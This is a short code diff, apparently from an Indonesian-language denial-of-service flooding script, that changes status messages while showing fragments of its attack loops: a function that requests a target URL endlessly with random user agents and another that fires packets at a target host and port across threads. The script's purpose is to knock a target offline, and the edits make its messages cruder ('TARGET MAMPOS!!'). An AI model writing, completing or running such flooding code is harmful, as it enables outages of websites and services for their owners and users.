@@ -45,7 +45,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mSedang Mengintaii TARGET...\033[0m")
+			print("\033[94mTARGET MAMPOS!!\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -59,7 +59,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Lucita Luna memukul target!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--PROSES MEMBUNUHANN!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mBerhenti<->ah\033[0m")
@@ -145,7 +145,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mLucita luna melakukan Pengecekan...\033[0m")
+	print("\033[94Sabar lagi ngecekk...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
